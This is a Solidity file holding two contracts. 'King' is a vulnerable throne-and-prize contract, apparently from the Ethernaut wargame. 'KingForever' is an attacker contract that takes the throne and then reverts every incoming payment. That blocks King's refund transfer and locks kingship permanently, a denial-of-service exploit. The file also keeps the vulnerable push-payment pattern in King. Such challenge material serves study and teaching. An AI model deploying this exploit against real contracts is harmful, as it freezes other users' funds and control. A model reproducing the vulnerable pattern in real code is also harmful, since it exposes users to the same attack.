// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingForever {
    King public king;
    
    constructor() public payable {
    }
    
    function getBalance() public view returns (uint){
        return address(this).balance;
    }
    
    function setKing(address payable _king) public {
        king = King(_king);
    }
    
    function becomeKing() public payable {
        (bool success, ) = payable(address(king)).call{value: msg.value}("");
        require(success);
    }
    
    receive() external payable {
        revert();
    }
}

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}